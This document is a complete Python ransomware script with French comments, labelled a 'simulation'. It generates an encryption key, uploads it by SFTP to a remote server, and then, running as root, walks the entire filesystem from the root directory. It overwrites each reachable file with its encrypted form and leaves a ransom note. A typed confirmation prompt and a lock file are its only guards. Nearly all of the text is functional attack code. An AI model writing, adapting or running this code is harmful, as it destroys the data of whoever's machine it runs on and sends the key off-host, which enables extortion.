#!/usr/bin/env python3
# ransomware_system_full.py - Simulation avancée avec chiffrement système complet

import os
import sys
import logging
import paramiko
from cryptography.fernet import Fernet
import socket
from datetime import datetime

# Configuration SFTP
SFTP_SERVER = "192.168.239.130"  # À configurer
SFTP_USER = "test"
SFTP_PASS = "test"
SFTP_PORT = 22
SFTP_REMOTE_PATH = "/upload"

# Configuration locale
LOG_FILE = "/tmp/ransomware_full_system.log"
RANSOM_NOTE = "/tmp/README_RANSOMWARE.txt"
SAFETY_LOCK = "/tmp/ransomware_safety.lock"  # Fichier de verrouillage

# Exclusions absolues (ne jamais chiffrer)
EXCLUSIONS = {
    '/proc', '/dev', '/sys', '/run', '/tmp',
    LOG_FILE, RANSOM_NOTE, SAFETY_LOCK, __file__
}


def safety_checks():
    """Vérifications de sécurité impératives"""
    # Protection contre les exécutions multiples
    if os.path.exists(SAFETY_LOCK):
        logging.critical("Lock file exists - aborting!")
        sys.exit(1)

    with open(SAFETY_LOCK, 'w') as f:
        f.write("Lock active - do not delete during operation")

    # Nécessite confirmation explicite
    print("""
    ⚠️ DANGER - CHIFFREMENT SYSTÈME COMPLET ⚠️

    Ce script va:
    1. Générer une clé de chiffrement
    2. L'envoyer à votre serveur SFTP
    3. Chiffrer TOUS les fichiers accessibles

    Appuyez sur Ctrl+C IMMÉDIATEMENT pour annuler
    """)

    if input("Tapez 'CHIFFREMENT-COMPLET' pour confirmer: ") != "CHIFFREMENT-COMPLET":
        os.remove(SAFETY_LOCK)
        sys.exit(0)


def send_key_via_sftp(key):
    """Envoi réel de la clé via SFTP"""
    try:
        transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
        transport.connect(username=SFTP_USER, password=SFTP_PASS)
        sftp = paramiko.SFTPClient.from_transport(transport)

        remote_filename = f"{socket.gethostname()}_key_{datetime.now().strftime('%Y%m%d_%H%M%S')}.crypt"
        remote_path = f"{SFTP_REMOTE_PATH}/{remote_filename}"

        with sftp.file(remote_path, 'wb') as f:
            f.write(key)

        sftp.close()
        transport.close()
        return True

    except Exception as e:
        logging.error(f"ERREUR SFTP: {str(e)}")
        return False


def should_encrypt(path):
    """Détermine si un fichier doit être chiffré"""
    path = os.path.abspath(path)
    return all(not path.startswith(excl) for excl in EXCLUSIONS)


def encrypt_file(path, fernet):
    """Chiffre un fichier individuel"""
    try:
        if not should_encrypt(path) or not os.path.isfile(path):
            return False

        with open(path, 'rb') as f:
            data = f.read()

        encrypted = fernet.encrypt(data)

        with open(path, 'wb') as f:
            f.write(encrypted)

        return True

    except Exception as e:
        logging.warning(f"Échec chiffrement {path}: {str(e)}")
        return False


def encrypt_system(fernet):
    """Parcourt et chiffre le système de fichiers"""
    encrypted_count = 0

    for root, dirs, files in os.walk('/'):
        for file in files:
            filepath = os.path.join(root, file)
            if encrypt_file(filepath, fernet):
                encrypted_count += 1
                if encrypted_count % 100 == 0:  # Log toutes les 100 opérations
                    logging.info(f"Chiffrés: {encrypted_count} - Traitement {filepath}")

    return encrypted_count


def main():
    # Configuration logging
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

    # Vérifications
    safety_checks()
    if os.geteuid() != 0:
        logging.critical("Doit être exécuté en root!")
        sys.exit(1)

    logging.critical("=== DÉBUT CHIFFREMENT SYSTÈME ===")

    # Génération clé
    key = Fernet.generate_key()
    fernet = Fernet(key)
    logging.info(f"Clé générée: {key[:16]}...")

    # Envoi SFTP
    if not send_key_via_sftp(key):
        logging.critical("Échec envoi clé - arrêt")
        sys.exit(1)

    # Chiffrement
    try:
        count = encrypt_system(fernet)
        logging.info(f"Chiffrement complet - {count} fichiers traités")

        # Note de rançon
        with open(RANSOM_NOTE, 'w') as f:
            f.write(f"""VOS FICHIERS ONT ÉTÉ CHIFFRÉS!

Clé de déchiffrement envoyée à: {SFTP_SERVER}
Fichiers chiffrés: {count}
""")

    finally:
        os.remove(SAFETY_LOCK)

    logging.critical("=== CHIFFREMENT TERMINÉ ===")


if __name__ == "__main__":
    main()